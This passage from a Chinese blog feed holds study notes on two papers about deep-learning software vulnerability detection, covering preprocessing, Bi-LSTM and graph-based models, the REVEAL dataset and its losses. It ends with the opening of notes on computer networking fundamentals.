1.AST层次的处理</h3><blockquote><p>针对真实世界项目数据集</p></blockquote><p>使用“codessensor”工具将源代码解析为ast，并使用深度优先遍历(DFT)遍历ast。这两种工具的组合可以将源代码转换为代码序列。</p><p>将每个函数转换为一个AST并随后转换为一个序列，并将每个序列标记为漏洞或非漏洞（与原始函数的标签对齐）</p><h3 id="2源代码层次的处理"><a class="markdownIt-Anchor" href="#2源代码层次的处理"></a> 2.源代码层次的处理</h3><blockquote><p>针对SARD项目数据集</p></blockquote><p>使用从源代码文件中提取的函数。分为三步：清理、混淆、转化</p><p><strong>清理</strong></p><p>在函数提取过程中，删除注释、空格、行内字符和分号，以便只保留代码内容。</p><p><strong>混淆</strong></p><p>脆弱函数和非脆弱函数包括作为函数名子字符串的文本“bad”和“good”或“bad sink”和“good sink”，通常也包含在变量和参数名中。为了避免ML算法被这些子字符串的存在所误导，作者使用了名为Snob的源代码混淆工具，用随机生成的名称混淆用户自定义函数、变量和参数的名称。但是，代码的结构、C库的名称、API函数和关键字保持不变。</p><p><strong>转化</strong></p><p>在代码混淆处理之后，我们将每个函数转换为文本向量，其中每个元素都是原始源代码函数的一个单词。如果一个函数是含有漏洞的，我们将其转换后的向量标记为有漏洞，否则为无漏洞。</p><h3 id="3填充和对齐"><a class="markdownIt-Anchor" href="#3填充和对齐"></a> 3.填充和对齐</h3><p>ML算法都要求固定的输入长度。对于从SARD项目源代码和真实漏洞数据源转换而来的序列，序列长度差异较大。</p><p>考虑到现实世界漏洞数据源中90%的序列小于1000个元素，所有SARD项目样本都小于1000个元素，我们需要平衡序列元素的数量和序列的稀疏性。因此，考虑到LSTM的容量，作者选择1000作为序列长度阈值</p><p>对于长序列，作者将其长度截断为1000;而短的则在序列的末尾用0填充。</p><p>对从两个数据源转换的序列应用相同的长度阈值和相同的填充/截断机制。</p><p>到这一步，来自SARD项目和真实的开源项目的样本已经被转换长度一致的文本向量序列。</p><h3 id="4词嵌入训练"><a class="markdownIt-Anchor" href="#4词嵌入训练"></a> 4.词嵌入训练</h3><p>应用Word2vec和连续词袋(Continuous Bag-of-Words, CBOW)模型将文本向量的每个元素转换为100维的词嵌入(这是默认设置)。</p><p>Word2vec模型使用来自SARD数据源和真实的开放源码项目的代码进行训练。为了确保ML模型捕获了代码的实际语义，而不是根据来自代码注释和描述的可能提示进行训练，作者只使用代码内容来训练Word2vec模型。</p><h2 id="c深度学习网络"><a class="markdownIt-Anchor" href="#c深度学习网络"></a> C.深度学习网络</h2><h3 id="1特征提取网络"><a class="markdownIt-Anchor" href="#1特征提取网络"></a> 1.特征提取网络</h3><p>采用Bi-LSTM网络，以一小批向量(序列)作为输入，输出对应输入序列含有漏洞或无漏洞的概率。结构如图：</p><p><img src="/posts/e99d01ee/Untitled%203.png" alt="Untitled"></p><ul><li>第一层是输入层，取一个张量，其形状为(num of samples, 1000)，其中参数num of samples表示批量大小，1000是填充长度，是样本的维数，在RNN中也称为时间序列。</li><li>第二层是上文提到的Word2vec嵌入层，它将输入样本的每个元素映射到一个100维向量，得到一个张量，其形状为(num of samples, 1000, 100)。</li><li>第三层和第四层为Bi-LSTM层，每层包含64个双向形式的LSTM单元，共形成128个LSTM单元。为了加快Bi-LSTM的训练过程，作者使用了基于NVIDIA CUDA深度神经网络库3的定制版LSTM CudnnLSTM实现。其形状为(num of samples, 1000, 128)</li><li>第五层是全局最大池化层，它在时间序列维度上降低了输出维度，旨在保留最重要的信息。形状为(num of samples, 128)。该结果表示了该序列含有漏洞的最大概率特征序列。</li><li>最后三层是致密层，训练时使用，使网络收敛到一个概率。前两个致密层分别包含128个和64个神经元，使用“ReLU”激活函数。因为漏洞的检测是一个二进制分类。因此，最后一层致密层采用“Sigmoid”激活，需要最小化的损失函数l为“二元交叉熵”。</li></ul><h3 id="2特征分类网络"><a class="markdownIt-Anchor" href="#2特征分类网络"></a> 2.特征分类网络</h3><p>采用随机森林分类器</p><p>使用上一层网络第五层的输出(全局max池化层的输出)作为特征表示来训练随机森林分类器。</p><p>对于测试集，采用训练好的网络来进行分类，以评估结果。</p><h1 id="iii评估"><a class="markdownIt-Anchor" href="#iii评估"></a> III.评估</h1><h2 id="a评价标准"><a class="markdownIt-Anchor" href="#a评价标准"></a> A.评价标准</h2><p>用于性能评估的指标是<strong>top-k精度</strong>(记为P@K)和<strong>top-k召回率</strong>(记为R@K)。</p><ul><li>P@K指的是排名前k的被预测为有漏洞的函数中，所有，真正的漏洞函数所占的比例</li><li>R@K表示排名前k的真正有漏洞的函数中，被预测为有漏洞的函数所占的比例。</li></ul><p><img src="/posts/e99d01ee/Untitled%204.png" alt="Untitled"></p><p>k可以是一个在10到200之间的可调整数，以模拟由于时间和资源的限制，检索到的函数数量受到限制的实际情况</p><h2 id="b实验设计"><a class="markdownIt-Anchor" href="#b实验设计"></a> B.实验设计</h2><ul><li>RQ1：所提网络生成的迁移学习特征表示对漏洞检测是否有效?</li><li>RQ2：如果RQ1的答案是肯定的，那么与不使用迁移学习生成的表征相比，特征表征的有效性如何?</li><li>RQ3：网络可以用作分类器而不是特征生成器吗?如果在用于分类之前使用与漏洞相关的数据源之一进行预先训练，网络将如何执行?（场景1）</li><li>RQ4：有必要使用两个网络来从两个异构的漏洞相关数据源学习表示吗?单一网络能否取得比较结果?（场景2）</li><li>RQ5：在上述两种情况下，与现有的漏洞检测系统相比，提出的框架的有效性如何?</li><li>RQ6：当检测不同类型的漏洞时，拟议的框架是如何执行的?</li></ul><h1 id="附录"><a class="markdownIt-Anchor" href="#附录"></a> 附录</h1><h2 id="1-pdf文件"><a class="markdownIt-Anchor" href="#1-pdf文件"></a> 1. PDF文件</h2><p><a href="Software%20Vulnerability%20Discovery%20via%20Learning%20Mult%207be1cbe8bdd24fc1963adebefb2bc245/Software_Vulnerability_Discovery_via_Learning_Multidomain_Knowledge_Bases(xuebalib.com).pdf">Software Vulnerability Discovery via Learning Multidomain Knowledge Bases(xuebalib.com).pdf</a></p><h2 id="2-参考文献"><a class="markdownIt-Anchor" href="#2-参考文献"></a> 2. 参考文献：</h2><p>[1] G. Lin et al., “Software Vulnerability Discovery via Learning Multi-Domain Knowledge Bases,” in IEEE Transactions on Dependable and Secure Computing, vol. 18, no. 5, pp. 2469-2485, 1 Sept.-Oct. 2021, doi: 10.1109/TDSC.2019.2954088.</p><p>[2] G. Lin, J. Zhang, W. Luo, L. Pan, Y . Xiang, O. De V el, and P . Montague, “Cross-project transfer representation learn-ing for vulnerable function discovery ,” IEEE T ransactions on Industrial Informatics, 2018.</p>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞检测</tag>
      
      <tag>论文笔记</tag>
      
      <tag>DeepLearning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《Deep Learning based Vulnerability Detection:Are We There Yet?》</title>
    <link href="/posts/1ab84c1/"/>
    <url>/posts/1ab84c1/</url>
    
    <content type="html"><![CDATA[<h1 id="deep-learning-based-vulnerability-detection-are-we-there-yet"><a class="markdownIt-Anchor" href="#deep-learning-based-vulnerability-detection-are-we-there-yet"></a> Deep Learning based Vulnerability Detection: Are We There Yet?</h1><blockquote><p>CCF  A类期刊；IEEE Transactions on Software Engineering (Early Access)；2021年</p></blockquote><h1 id="abstract"><a class="markdownIt-Anchor" href="#abstract"></a> <strong>Abstract</strong></h1><p>最先进的基于dl的技术在真实世界的漏洞预测场景的效果下降了50%以上。原因是现有的基于dl的漏洞预测方法在训练数据和模型选择方面存在问题，通常无法了解与漏洞的实际原因相关的特性。</p><p>基于以上原因，本文采用更有原则的方法来收集数据和设计模型，并基于脆弱性预测的现实设置，从而得出更好的解决方案，并为未来基于dl的漏洞预测研究绘制了路线图</p><h1 id="i-introduction"><a class="markdownIt-Anchor" href="#i-introduction"></a> <strong>I. Introduction</strong></h1><h2 id="a现有dl模型存在的问题"><a class="markdownIt-Anchor" href="#a现有dl模型存在的问题"></a> <strong>A.现有DL模型存在的问题</strong></h2><ul><li><strong>模型本身的不足</strong>。最流行的模型是基于标记的，它将代码视为标记的序列，而不考虑在漏洞预测中扮演重要角色的语义依赖。即使使用基于图的模型，它也不会关注于增加脆弱和非脆弱类别之间的类分离。因此，在真实世界中，他们具有低精度和低召回率的问题。</li><li><strong>学习无关特性</strong>。现有的最先进的模型本质上是在获取与漏洞无关的特征，这些特征可能是训练数据集的产物。</li><li><strong>数据重复</strong>。大多数现有方法的训练和测试数据包含重复数据(高达68%);因此，人为夸大了报告的结果。</li><li><strong>数据不平衡</strong>。现有的方法并不能缓解类不平衡问题。现实漏洞分布作为非漏洞代码的频率要比漏洞代码的频率高得多。</li></ul><h2 id="b本文提出的方法"><a class="markdownIt-Anchor" href="#b本文提出的方法"></a> <strong>B.本文提出的方法</strong></h2><p><strong>REVEAL——更有原则的数据收集和模型构建方法</strong></p><h3 id="1-数据收集"><a class="markdownIt-Anchor" href="#1-数据收集"></a> <strong>1) 数据收集</strong></h3><p>讨论了如何整合真实世界漏洞预测数据，包括静态和进化(即bug修复)性质的漏洞</p><h3 id="2-模型构建"><a class="markdownIt-Anchor" href="#2-模型构建"></a> <strong>2) 模型构建</strong></h3><p>展示了表示学习可以用于传统的DL方法之上，以增加脆弱样本和非脆弱样本之间的类分离。</p><h1 id="iibackground-and-challenges"><a class="markdownIt-Anchor" href="#iibackground-and-challenges"></a> <strong>II.Background and Challenges</strong></h1><p>最流行的DLVP方法包括三个步骤:数据收集、模型构建和评估。</p><ul><li>首先，收集训练数据，根据设计目标和资源约束选择合适的模型。</li><li>根据所选模型的格式对训练数据进行预处理。然后对模型进行训练，使损失函数最小。</li><li>经过训练的模型将用于现实世界。为了评估模型的有效性，在不可见的测试实例上评估了模型的性能。</li></ul><h2 id="adlvp理论"><a class="markdownIt-Anchor" href="#adlvp理论"></a> <strong>A.DLVP理论</strong></h2><p>基于DL的漏洞预测器从一个训练数据(Dtrain)集中学习漏洞代码模式，其中代码元素被标记为漏洞或非漏洞。给定一个代码元素(x)和相应的脆弱/非脆弱标签(y)，模型的目标是学习关于模型参数(θ)的概率p(y|x)最大化的特征。</p><blockquote><p>P(y|x)表征漏洞元素x有漏洞的概率</p></blockquote><p>通常，这种转换和概率计算是通过模型中的一个前馈层和一个softmax层来实现的。</p><p>对于漏洞预测等二元分类任务，通过最小化交叉熵损失来学习最优模型参数。</p><h2 id="b现有的数据集"><a class="markdownIt-Anchor" href="#b现有的数据集"></a> <strong>B.现有的数据集</strong></h2><p>数据集的类型可分为如下：</p><ul><li>合成数据集： SATE IV Juliet、SARD</li><li>半合成数据集：Draper、SARD、NVD</li><li>真实数据集：Devign（包含来自四个开源项目过去的漏洞和其修复）</li></ul><p>越靠近左下角合成度越高，反之真实度越高</p><p><img src="/posts/1ab84c1/Untitled.png" alt="Untitled"></p><p><strong>局限性</strong></p><ol><li>由简单模式组成的合成数据集上训练的模型将仅限于检测那些在现实生活中很少出现的简单模式，即只能学习到简单的漏洞模式，对于复杂的漏洞模式难以检测</li><li>数据集不能反映真实世界的漏洞代码分布</li><li>数据集一般只含有漏洞代码及其修复，不含有其上下文，所以基于这些数据集的模型也无法学习到漏洞代码和其上下文的关联。使得模型无法区分漏洞函数和其上下文。</li></ol><h2 id="c现有的建模技术"><a class="markdownIt-Anchor" href="#c现有的建模技术"></a> <strong>C.现有的建模技术</strong></h2><p><strong>基于标记的模型</strong></p><p>这些模型中，代码被认为是标记的序列</p><ul><li>简单的基于符号的模型<ul><li>Li等人提出了一种基于双向长短期记忆(BSLTM)的模型</li><li>Russell等人提出了一种基于卷积神经网络(CNN)和Radom森林的模型</li></ul></li></ul><blockquote><p>符号序列长度是影响性能的一个重要因素，因为模型很难对长序列进行推理</p></blockquote><ul><li>对代码切片的模型<ul><li>VulDeePecker和SySeVR对代码进行切片</li></ul></li></ul><blockquote><p>切片动机：并不是代码中的每一行对漏洞预测都同等重要。因此，不考虑整个代码，只考虑从代码中“感兴趣的点”提取的片段(如API调用、数组索引、指针使用等)进行漏洞预测，其余部分不考虑。</p></blockquote><p><strong>基于图的模型</strong></p><p>这些模型将代码视为图形，并合并了不同的语法和语义依赖关系。可以使用不同类型的<strong>语法图</strong>(抽象语法树)和<strong>语义图</strong>(控制流图、数据流图、程序依赖图、Def-Use链图等)进行漏洞预测</p><ol><li>Yamaguchi等人提出的Devign杠杆代码属性图(CPG)，建立他们基于图的漏洞预测模型。CPG是通过在代码的抽象语法树(AST)中增加不同的依赖边(如控制流、数据流、化解等)来构建的**。**</li></ol><p><strong>局限性</strong></p><ol><li>基于标记的模型假设标记之间是线性依赖的，因此标记之间只存在词法上的依赖，而失去了语义上的依赖</li><li>基于图的模型可以考虑数据依赖边，但是资源开销更大，在资源受限的环境表现不好</li><li>尽管经过训练的模型学会了区分漏洞和良性代码样本，但训练范式并没有明确地专注于增加漏洞和良性示例之间的分离。因此，稍有变化，分类就会变得脆弱。</li><li>另一个问题是漏洞代码和良性代码之间的数据不平衡，真实世界数据集中漏洞示例与良性示例的比例非常低。当一个模型在这样不平衡的数据集上训练时，模型往往会被良性的例子所误导。</li></ol><h2 id="d评估过程"><a class="markdownIt-Anchor" href="#d评估过程"></a> <strong>D.评估过程</strong></h2><p><strong>局限性</strong></p><p>所有现有的方法都使用它们自己的评估数据集来报告它们的性能，但它并没有对模型在现实世界中的适用性给出一个全面的概述。能从这种数据集内评估中学到的是，现有的方法如何适合他们自己的数据集。</p><p>尽管有一些关于在现实世界的项目中发现漏洞的这种模型的有限的案例研究，这些案例研究并没有阐明假阳性和假阴性。假阳性和假阴性的数量与开发人员在漏洞预测上的工作直接相关，太多的假阳性和假阴性会阻碍开发人员使用模型。</p><h1 id="iiireveal设计"><a class="markdownIt-Anchor" href="#iiireveal设计"></a> <strong>III.REVEAL设计</strong></h1><h2 id="a数据收集"><a class="markdownIt-Anchor" href="#a数据收集"></a> <strong>A.数据收集</strong></h2><p>通过跟踪两个开源项目(Linux Debian Kernel和Chromium (Chrome的开源项目))过去的漏洞，构建了一个更健壮、更全面的真实世界数据集REVEAL。</p><p>过程：</p><ol><li>首先用公开的补丁收集已经修复的问题。对于Chromium，我们删除了它的bug库Bugzilla2。对于Linux Debian内核，我们从Debian安全跟踪器3收集了问题。</li><li>对于每个补丁，提取了补丁中发生变化的C/ c++源文件和头文件对应的漏洞和修复版本(即旧版本和新版本)。将所有更改函数的前版本(即补丁之前的版本)标注为“vulnerable”，将所有更改函数的固定版本(即补丁之后的版本)标注为“clean ”。此外，补丁中没有涉及的其他功能(即那些保持不变的功能)都被标注为’ clean ’</li></ol><h2 id="b模型构建"><a class="markdownIt-Anchor" href="#b模型构建"></a> <strong>B.模型构建</strong></h2><p><img src="/posts/1ab84c1/Untitled%201.png" alt="Untitled"></p><p>分为两个阶段，即<strong>特征提取</strong>和<strong>训练</strong>。</p><ul><li>在<strong>特征提取</strong>阶段，将现实世界的代码转换为图形嵌入。</li><li>在<strong>训练</strong>阶段，根据提取的特征训练一个表示学习模型，以学习最理想地将脆弱的例子与非脆弱的例子区分开来的表示。</li></ul><h3 id="1-特征提取"><a class="markdownIt-Anchor" href="#1-特征提取"></a> <strong>1) 特征提取</strong></h3><p>该阶段的目标是在保持语义和语法信息的同时，将代码转换为一个紧凑的、长度一致的特征向量。</p><ol><li><strong>生成代码属性图（CPG）</strong><ol><li>CPG提供了由AST和程序依赖图(或PDG)之外的控制流和数据流图的元素组成的代码的组合和简洁表示。</li></ol></li><li><strong>结点特征提取</strong></li></ol><ul><li>结点由结点类型（算数表达式、函数调用等）和原始代码片段组成。</li><li>用独热向量编码结点类型，用word2vec对原始代码片段完成词嵌入将两者连接组成结点的联合向量</li></ul><ol><li><p><strong>GGNN嵌入</strong></p><ol><li>第二步只提取到了单个结点的特征，没有结点之间的关联，这可以通过嵌入结点和邻居之间的信息来完成。</li><li>为每一个顶点分配一个GRU，然后将顶点和边作为GGNN的输入</li><li>对每个结点执行如下更新：</li><li>将其和相邻结点的边的信息嵌入到当前结点</li></ol><p><img src="/posts/1ab84c1/Untitled%202.png" alt="Untitled"></p></li><li><p><strong>图嵌入</strong></p></li></ol><p><img src="/posts/1ab84c1/Untitled%203.png" alt="Untitled"></p><p>将每个结点的向量集合起来，使其成为一个表示整个CPG图的单个向量</p><p>集合函数可以用求和的方式，可配置</p><p>算法流程</p><p><img src="/posts/1ab84c1/Untitled%204.png" alt="Untitled"></p><h3 id="2-训练"><a class="markdownIt-Anchor" href="#2-训练"></a> <strong>2) 训练</strong></h3><p><strong>a.重采样</strong></p><blockquote><p>原始数据集存在的问题：漏洞类和无漏洞类数量的不平衡</p></blockquote><p>使用“合成少数过采样技术”(简称SMOTE)来处理漏洞类和无漏洞类数量的不平衡，通过改变数据中不同类的频率来操作。</p><p>具体来说SMOTE对多数类进行子采样(即随机删除一些示例)，同时对少数类进行超采样(通过创建合成示例)，直到所有类具有相同的频率。在脆弱性预测的情况下，少数类通常是脆弱实例。</p><ul><li>在超采样过程中，SMOTE选择一个脆弱例子，找出k个最近的脆弱邻居。然后，它通过在自己和最近的随机邻居之间插入，构建一个少数民族的合成成员。</li><li>在欠采样时，SMOTE随机地从训练集中移除非脆弱样本。这个过程会不断重复，直到脆弱和非脆弱示例之间达到平衡。</li></ul><p>算法流程：</p><p><img src="/posts/1ab84c1/Untitled%205.png" alt="Untitled"></p><p><strong>b.表示学习</strong></p><blockquote><p>原始数据集存在的问题：特征提取后漏洞和无漏洞代码样本的图嵌入在特征空间中趋于高度重叠</p></blockquote><p>使用多层感知器(MLP)将原始不可分空间中的特征投射到一个潜在空间中，在漏洞样本和无漏洞样本之间提供更好的可分离性。以解决漏洞和无漏洞代码样本的图嵌入在特征空间中趋于高度重叠。</p><p><strong>MLP设计</strong></p><p>MLP由三层组成：输入层、中间层、输出层</p><p>本文的表示学习模型以原始嵌入图xg作为输入，并通过中间层f(·，θ)。中间层将原始嵌入图xg投影到一个隐藏空间h(xg)上。最后，输出层使用隐藏空间中的特征来预测漏洞。</p><p>公式为：</p><p><img src="/posts/1ab84c1/Untitled%206.png" alt="Untitled"></p><p>σ表示softmax函数，hg表示潜在表示，W和b分别表示模型权重和偏差</p><p><strong>损失函数</strong></p><p>为了使隐藏空间中漏洞实例和非漏洞实例的分离最大化，采用了三重态损失作为损失函数。三重态损失由三个单独的损失函数组成:</p><ul><li><p>(a)交叉熵损失( <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mrow><mi>C</mi><mi>E</mi></mrow></msub></mrow><annotation encoding="application/x-tex">L_{CE}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07153em;">C</span><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>);</p><ul><li>交叉熵损耗随着预测概率偏离实际标签而增加</li></ul><p><img src="/posts/1ab84c1/Untitled%207.png" alt="Untitled"></p></li><li><p>(b)投影损失(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">L_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>);</p><ul><li>用于量化隐藏表示如何很好地分离漏洞和非漏洞的例子，如果隐藏空间中所有的漏洞例子彼此靠近，而同时又远离所有的非漏洞例子，即来自同一类别的例子彼此非常接近(即相似)，而来自不同类别的例子彼此很远，则认为隐藏表示是有用的。</li></ul><p><img src="/posts/1ab84c1/Untitled%208.png" alt="Untitled"></p></li><li><p>©正则化损失(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mrow><mi>r</mi><mi>e</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">L_{reg}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> )。</p><ul><li>用于限制隐藏表示(h(xg))的大小，h(xg)的任意增加会阻止模型收敛，所以使用正则化损失(Lreg)来惩罚在量级上较大的潜在表示(h(xg))</li></ul><p><img src="/posts/1ab84c1/Untitled%209.png" alt="Untitled"></p></li></ul><p>总的损失表示为：</p><p><img src="/posts/1ab84c1/Untitled%2010.png" alt="Untitled"></p><p>损失函数：</p><p><img src="/posts/1ab84c1/Untitled%2011.png" alt="Untitled"></p><p>利用三重损失函数，REVEAL通过最小化损失函数来训练模型对其参数(即θ， W, b)进行优化。</p><p>分离结果对比：</p><p><img src="/posts/1ab84c1/Untitled%2012.png" alt="Untitled"></p><h1 id="iv评估"><a class="markdownIt-Anchor" href="#iv评估"></a> <strong>IV.评估</strong></h1><p>从三个方面进行了评估：</p><ol><li>现有漏洞预测方法的有效性</li><li>现有DLVP方法的主要局限性</li><li>REVEAL的有效性</li></ol><h1 id="附录"><a class="markdownIt-Anchor" href="#附录"></a> <strong>附录</strong></h1><h2 id="1-pdf文件"><a class="markdownIt-Anchor" href="#1-pdf文件"></a> <strong>1. PDF文件</strong></h2><p><a href="Deep%20Learning%20based%20Vulnerability%20Detection%20Are%20We%208056d64fb1594beca301ebdccc9f5568/2009.07235.pdf">2009.07235.pdf</a></p><h2 id="2-参考文献"><a class="markdownIt-Anchor" href="#2-参考文献"></a> <strong>2. 参考文献：</strong></h2><p><a href="https://ieeexplore.ieee.org/abstract/document/9448435">S. Chakraborty, R. Krishna, Y. Ding and B. Ray, “Deep Learning based Vulnerability Detection: Are We There Yet,” in IEEE Transactions on Software Engineering, doi: 10.1109/TSE.2021.3087402.</a></p>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞检测</tag>
      
      <tag>论文笔记</tag>
      
      <tag>DeepLearning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络学习笔记</title>
    <link href="/posts/9d1d146e/"/>
    <url>/posts/9d1d146e/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-计算机网络和因特网"><a class="markdownIt-Anchor" href="#第1章-计算机网络和因特网"></a> 第1章 计算机网络和因特网</h1><h2 id="11-什么是因特网"><a class="markdownIt-Anchor" href="#11-什么是因特网"></a> 1.1 什么是因特网</h2><h3 id="111-具体构成描述"><a class="markdownIt-Anchor" href="#111-具体构成描述"></a> 1.1.1 具体构成描述</h3><ul><li><p>因特网是一个世界范围的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p></li><li><p><strong>端系统</strong>通过<strong>通信链路</strong>（communication link)和<strong>分组交换机</strong>（packet switch)连接到一起。</p></li><li><p><strong>分组交换机</strong>从它的一条入通信链路接收到达的分组，并从它的一条出通信链路转发该分组。两种最著名的分组交换机类型是<strong>路由器</strong>（router)和<strong>链路层交换机</strong>(link-layer switch)。</p></li><li><p>端系统通过<strong>因特网服务提供商</strong>（Internet Service Provider,<strong>ISP</strong>)接入因特网</p></li><li><p>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议</strong>(protocol),这些协议控制因特网中信息的接收和发送。<strong>TCP</strong>(<code>Transmission Control Protocol</code>,传输控制协议）和<strong>IP</strong><br>(<code>Internet Protocol</code>,网际协议）是因特网中两个最为重要的协议。IP协议定义了在路由器和端系统之间发送和接收的分组格式。</p></li><li><p><strong>协议</strong>(<code>protocol</code>)定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送和/或接收一条报文或其他事件所采取的动作。</p></li></ul><h2 id="12-网络边缘"><a class="markdownIt-Anchor" href="#12-网络边缘"></a> 1.2 网络边缘</h2><p>与因特网相连的计算机和其他设备，因为它们位于因特网的边缘，故而被称为<strong>端系统</strong></p><p>端系统也称为<strong>主机</strong>（host)，又可以分为</p><ul><li>客户(client)</li><li>服务器（server)</li></ul><h3 id="121-接入网"><a class="markdownIt-Anchor" href="#121-接入网"></a> 1.2.1 接入网</h3><p><strong>接入网</strong>，这是指将端系统物理连接到其<strong>边缘路由器</strong>（edgerouter)的网络。</p><p><strong>边缘路由器</strong>是端系统到任何其他远程端系统的路径上的第一台路由器</p><ol><li><p>家庭接入：DSL、电缆、FTTH、拨号和卫星</p><ul><li><p>数字用户线（Digital Subscriber Line，<br>DSL)</p><p>家庭电话线同时承载了数据和传统的电话信号， 它们用不同的频率进行编码：<br>• 高速下行信道， 位于50kHz 到 1 MHz 频段；<br>• 中速上行信道， 位于 4kHz 到 50kHz 频段；<br>• 普通的双向电话信道， 位于0 到 4kHz 频段。</p></li><li><p>电缆因特网接入（cable Internet access)</p></li><li><p>光纤到户（Fiber To The Home, FTTH)</p></li></ul></li><li><p>企业（和家庭）接入：以太网和WiFi</p><p><img src="/posts/9d1d146e/image-20220224113740807.png" alt="image-20220224113740807"></p><ul><li>以太网用户使用双绞铜线与一台以太网交换机相连</li></ul></li><li><p>广域无线接入：3G和TLE</p></li></ol><h3 id="122-物理媒体"><a class="markdownIt-Anchor" href="#122-物理媒体"></a> 1.2.2 物理媒体</h3><p>物理媒体分成两种类型： 导引型媒体（ guided media ) 和非导引型媒体（unguided media)。</p><ul><li><p>对于导引型媒体，电波沿着固体媒体前行，如光缆、双绞铜线或同轴电缆。</p></li><li><p>对于非导引型媒体，电波在空气或外层空间中传播，例如在无线局域网或数字卫星频道中</p></li></ul><h2 id="13-网络核心"><a class="markdownIt-Anchor" href="#13-网络核心"></a> 1.3 网络核心</h2><ul><li><p>路由器</p></li><li><p>网络的网络</p></li></ul><h3 id="131-分组交换"><a class="markdownIt-Anchor" href="#131-分组交换"></a> 1.3.1 分组交换</h3><p>特点</p><ul><li>不需要资源预留</li><li>按需使用资源，可能要排队等待：同时有其它分组发送。</li><li>如，因特网。</li></ul><p>为了从源端系统向目的端系统发送一个<strong>报文</strong>， 源将长报文划分为较小的数据块， 称之为<strong>分组</strong>(packet)。</p><p>在源和目的地之间， 每个分组都通过<strong>通信链路</strong>和<strong>分组交换机</strong>（ packet switch )传送。 （ 交换机主要有两类： <strong>路由器</strong>（ router) 和<strong>链路层交换机</strong> ( link-layer switch ) )</p><p><strong>分组</strong>以等于该链路最大传输速率的速度传输通过通信链路。</p><p><img src="/posts/9d1d146e/image-20220224165531713.png" alt="image-20220224165531713"></p><ol><li><p><strong>存储转发传输</strong></p><ul><li><p>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前， 必须接收到整个分组。</p></li><li><p>由N条速率均为R的链路组成的路径（ 所以，在源和目的地之间有 N-1 台路由器） ， 从源到目的地发送一个分组。应用如上相同的逻辑， 我们看到端到端时延是：</p><p><img src="/posts/9d1d146e/image-20220423104930824.png" alt="image-20220423104930824"></p></li><li><p>分组交换机具有一个<strong>输出缓存</strong>（ output buffer, 也称为输出队列（ output queue)), 它用于存储路由器准备发往那条链路的分组。分组要承受输出缓存的<strong>排队时延</strong></p></li><li><p>因为缓存空间的大小是有限的， 一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。 在此情况下， 将出现<strong>分组丢失（丢包）</strong>( packet loss), 到达的分组或已经排队的分组之一将被丢弃。</p></li></ul></li><li><p><strong>转发表和路由选择协议</strong></p><p>每台路由器具有一个<strong>转发表</strong>( forwarding table), 用于将目的地址（ 或目的地址的一部分）映射成为输出链路。</p><p><strong>路由选择协议</strong>可以决定从每台路由器到每个目的地的最短路径， 并使用这些最短路径结果来配置路由器中的转发表。</p></li></ol><h3 id="132-电路交换"><a class="markdownIt-Anchor" href="#132-电路交换"></a> 1.3.2 电路交换</h3><p>特点：</p><ul><li>预留端到端资源：端系统之间通信路径上所需要的资源 (缓存，链路带宽)。建立连接。</li><li>发送方以恒定速率向接收方传送数据。</li><li>如，电话网络。</li></ul><p>在电路交换网络中， 在端系统间通信会话期间， <strong>预留了端系统间沿路径通信所需要的资源</strong>（ 缓存， 链路传输速率）。</p><p>在发送方能够发送信息之前， 该网络必须在发送方和接收方之间建立一条连接。 这是一个名副其实的连接， 因为此时沿着发送方和接收方之间路径上的交换机都将为该连接维护连接状态。 用电话的术语来说， 该连接被称为一条电路( circuit )0 当网络创建这种电路时， 